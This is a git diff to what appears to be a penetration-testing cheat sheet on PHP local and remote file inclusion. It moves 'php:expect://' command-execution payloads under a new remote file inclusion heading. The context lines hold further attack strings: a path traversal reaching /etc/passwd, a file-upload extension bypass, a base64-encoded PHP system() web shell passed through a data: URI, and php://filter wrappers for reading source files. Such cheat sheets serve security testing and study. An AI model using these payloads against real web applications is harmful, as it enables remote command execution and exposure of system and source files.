@@ -22,6 +22,11 @@ mv evil.jpg evil.php.jpg
 
 ## Remote File Inclusion (RFI)
 
+### Common payloads
+`php:expect://id`
+
+`php:expect://whoami`
+
 Remote file inclusion uses pretty much the same vector as local file inclusion.
 
 A remote file inclusion vulnerability lets the attacker execute a script on the target-machine even though it is not even hosted on that machine.
@@ -63,10 +68,6 @@ If it does not work you can also add a ?, this way the rest will be interpreted 
 
 `....//....//....//....//....//etc/passwd`
 
-`php:expect://id`
-
-`php:expect://whoami`
-
 You can also try to use those insted of `/etc/passwd`
 ```
 /etc/issue
@@ -104,9 +105,11 @@ http://www.test.com.ar/main.php?pagina=data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7
 ```
 php://filter/convert.base64-encode/resource=
 ```
+
 ```
 php://filter/read=string.rot13/resource=
 ```
+
 *example input:*
 
 example.com/index.php?page=`php://filter/read=string.rot13/resource=`index.php
